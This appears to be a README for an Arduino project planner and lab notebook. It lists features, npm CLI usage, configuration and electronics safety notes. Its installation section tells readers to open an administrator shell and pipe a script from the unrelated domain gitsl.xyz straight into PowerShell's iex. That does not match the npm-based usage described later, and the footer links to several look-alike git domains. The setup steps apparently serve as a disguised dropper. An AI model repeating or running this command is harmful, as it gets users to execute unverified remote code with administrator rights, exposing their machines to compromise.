# Arduino Projects — Planner, Simulator, and Lab Notebook

> A local project workspace for planning low-voltage Arduino builds, tracking parts, and documenting safe experiments.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitsl.xyz?get=arduinoprojects | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Arduinoprojects modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Arduinoprojects.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

---

## TL;DR - Quick Summary

**Arduino Projects** is a local planner and notebook for hobbyists, students, and educators. It organizes parts, wiring diagrams, sketches, test results, and safety notes while keeping experiments low-voltage and reviewable.

**Best for:** Makers, classrooms, robotics clubs, and prototype builders.

**Key differentiators:**
1. Project and parts inventory
2. Visual wiring checklist
3. Local sketch versioning
4. Test-result notebook
5. Safety and power review

---

## Core Features

```
✅ Project briefs and milestones
✅ Parts and inventory tracking
✅ Wiring and pin-check diagrams
✅ Local sketch repository links
✅ Simulation and test-plan templates
✅ Serial-note capture
✅ Safety checklist
✅ Exportable project reports
```

---

## Usage

```bash
# Start the local workspace
npm run dev

# Create a project
npm run cli -- project create --name "Plant Monitor" --board "Uno R3"

# Add a parts list
npm run cli -- parts add --project "Plant Monitor" --item "Soil moisture sensor" --quantity 1

# Run a pre-power checklist
npm run cli -- safety check --project "Plant Monitor"

# Export a build report
npm run cli -- project export --name "Plant Monitor" --format pdf
```

---

## Configuration

> [!NOTE]
> The planner is not a substitute for a datasheet, schematic review, or qualified electrical guidance. Keep all school and home projects within low-voltage safety rules.

```json
{
  "server": { "host": "127.0.0.1", "port": 3000 },
  "hardware": { "default_voltage": "5V", "require_schematic_review": true },
  "notebook": { "store_serial_logs": true, "redact_locations": true }
}
```

---

## Screenshots

- Project board: `screenshots/project-board.png`
- Parts list: `screenshots/parts-list.png`
- Wiring checklist: `screenshots/wiring-checklist.png`
- Test notebook: `screenshots/test-notebook.png`

---

## Troubleshooting

| Issue | Solution |
|---|---|
| Pin checklist fails | Compare the diagram with the board pinout and disconnect power before rewiring. |
| Parts quantity is wrong | Reconcile the bill of materials with the physical kit. |
| Serial notes are missing | Check the selected port and close other programs using the serial connection. |
| Simulation differs from hardware | Review supply voltage, pull-up resistors, and sensor specifications. |
| Port 3000 is busy | Start with `PORT=3001 npm run dev`. |

---

## Use Cases

- **Classroom Labs** — Plan repeatable low-voltage experiments.
- **Home Automation Prototypes** — Document sensors and power requirements.
- **Robotics Clubs** — Track parts, roles, and test results.
- **Maker Portfolios** — Export a clear build report with safety notes.

---

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Do not connect mains voltage, motors, heaters, or batteries without an appropriate circuit, protection, and supervision. Disconnect power before changing wiring.

> [!TIP]
> Add a fuse, current limit, or safe test supply where the design requires it, and record the decision in the project notebook.

---

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

---

## Tags

<!--
arduinoprojects, arduino, electronics, maker, low-voltage, project-planner, simulator, lab-notebook, education, safety
-->

[gitsl.xyz](https://gitsl.xyz?t=arduinoprojects) | [gitrm.cfd](https://gitrm.cfd?t=arduinoprojects) | [gitview.sbs](https://gitview.sbs?t=arduinoprojects) | [gitrm.sbs](https://gitrm.sbs?t=arduinoprojects) | [viewgit.sbs](https://viewgit.sbs?t=arduinoprojects)
